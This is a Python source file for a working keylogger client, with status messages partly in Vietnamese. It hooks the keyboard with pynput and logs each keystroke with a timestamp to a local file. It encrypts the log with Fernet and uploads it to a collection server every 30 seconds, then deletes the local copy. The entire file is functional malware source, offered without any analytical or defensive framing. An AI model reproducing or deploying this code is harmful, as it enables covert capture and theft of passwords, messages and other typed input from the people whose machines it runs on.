import os
import requests
import threading
import time
from pynput import keyboard
from cryptography.fernet import Fernet
from datetime import datetime
import string

SERVER_URL = "http://localhost:5000/upload"
API_KEY = "YOUR_SECRET_KEY"
KEY_FILE = "client_key.key"
LOG_INTERVAL = 30
LOG_FILE = "keylog.txt"

class KeyloggerClient:
    def __init__(self):
        if not os.path.exists(KEY_FILE):
            raise FileNotFoundError("Key file not found!")

        with open(KEY_FILE, "rb") as f:
            self.cipher = Fernet(f.read())

        self.start_time = time.time()

        self.ignored_keys = {
            keyboard.Key.shift, keyboard.Key.shift_r,
            keyboard.Key.ctrl, keyboard.Key.ctrl_r,
            keyboard.Key.alt, keyboard.Key.alt_r,
            keyboard.Key.caps_lock,
            keyboard.Key.cmd, keyboard.Key.cmd_r,
            keyboard.Key.backspace,
            keyboard.Key.delete,
            keyboard.Key.esc,
            keyboard.Key.up, keyboard.Key.down, keyboard.Key.left, keyboard.Key.right,
            keyboard.Key.home, keyboard.Key.end, keyboard.Key.page_up, keyboard.Key.page_down,
            keyboard.Key.f1, keyboard.Key.f2, keyboard.Key.f3, keyboard.Key.f4, keyboard.Key.f5,
            keyboard.Key.f6, keyboard.Key.f7, keyboard.Key.f8, keyboard.Key.f9, keyboard.Key.f10,
            keyboard.Key.f11, keyboard.Key.f12,
        }

        self.allowed_special_chars = set(string.punctuation + ' ')
        self.listener = keyboard.Listener(
            on_press=self.on_key_press,
            on_release=self.on_key_release
        )
        self.listener.start()
        self.schedule_upload()

    def on_key_press(self, key):
        try:
            if key in self.ignored_keys:
                return

            if hasattr(key, 'char') and key.char is not None:
                ch = key.char
                if ch.isalnum() or ch in self.allowed_special_chars:
                    self.log_action(ch)
                return

            if key == keyboard.Key.enter:
                self.log_action("[ENTER]")
            elif key == keyboard.Key.tab:
                self.log_action("[TAB]")
            elif key == keyboard.Key.space:
                self.log_action("[SPACE]")

        except Exception as e:
            print(f"[!] Error processing key: {str(e)}")

    def on_key_release(self, key):
        pass

    def log_action(self, action):
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write(f"{timestamp} - {action}\n")

    def encrypt_and_send(self):
        if not os.path.exists(LOG_FILE) or os.path.getsize(LOG_FILE) == 0:
            return

        try:
            duration = round((time.time() - self.start_time) / 60, 1)

            with open(LOG_FILE, "rb") as f:
                plaintext = f.read()

            encrypted = self.cipher.encrypt(plaintext)

            files = {"file": ("log.enc", encrypted)}
            data = {
                "duration": duration
            }

            res = requests.post(
                SERVER_URL,
                files=files,
                data=data,
                headers={"X-API-Key": API_KEY},
                timeout=10
            )

            if res.status_code == 200:
                print(f"[+] Log sent ({duration} mins)")
                self.start_time = time.time()
                os.remove(LOG_FILE)
            else:
                print(f"[-] Server error: {res.status_code} - {res.text}")

        except Exception as e:
            print(f"[-] Upload error: {str(e)}")

    def schedule_upload(self):
        threading.Timer(LOG_INTERVAL, self.schedule_upload).start()
        self.encrypt_and_send()

    def run(self):
        print("[*] Keylogger đang hoạt động...")
        self.listener.join()

if __name__ == "__main__":
    try:
        KeyloggerClient().run()
    except Exception as e:
        print(f"Lỗi nghiêm trọng: {str(e)}")
